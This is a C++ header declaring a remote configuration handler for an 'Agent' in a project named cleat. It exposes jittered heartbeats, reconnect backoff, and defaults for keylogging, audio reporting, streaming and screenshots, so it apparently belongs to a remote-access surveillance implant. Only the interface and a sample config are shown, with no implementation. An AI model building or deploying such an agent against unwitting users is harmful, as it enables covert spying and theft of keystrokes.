/**
 * @file SetConfigHandler.hpp
 * @brief 配置设置命令处理器
 * 
 * 通用远程配置下发处理器，支持动态调整Agent运行参数。
 */

#pragma once
#include "Core/Command/Handlers/IHandler.hpp"

namespace cleat {

    /**
     * @brief 配置设置命令处理器
     * 
     * 支持远程下发配置参数，动态调整Agent的运行行为。
     * 支持的配置参数包括：
     * - 工作超时和首次连接延迟
     * - 心跳间隔和抖动参数
     * - 重连策略参数
     * - 服务默认参数（音频报告、键盘记录、流媒体帧等）
     * - 截图质量和缩放参数
     */
    class SetConfigHandler : public IHandler {
    public:
        /**
         * @brief 执行配置设置命令
         * @param req.params 配置参数JSON对象
         * @param req.payload 可选的二进制数据（当前未使用）
         * @return 响应JSON（包含设置结果）
         * 
         * @note 支持的参数格式：
         * @code
         * {
         *   "worker_timeout_ms": 30000,
         *   "heartbeat": {
         *     "base_interval_ms": 5000,
         *     "jitter_ratio_permille": 100,
         *     "active_interval_ms": 1000
         *   },
         *   "reconnect": {
         *     "first_connect_base_ms": 1000,
         *     "base_ms": 5000,
         *     "max_ms": 30000
         *   }
         * }
         * @endcode
         */
        nlohmann::json Execute(const CommandRequest& req) override;
    };

} // namespace cleat
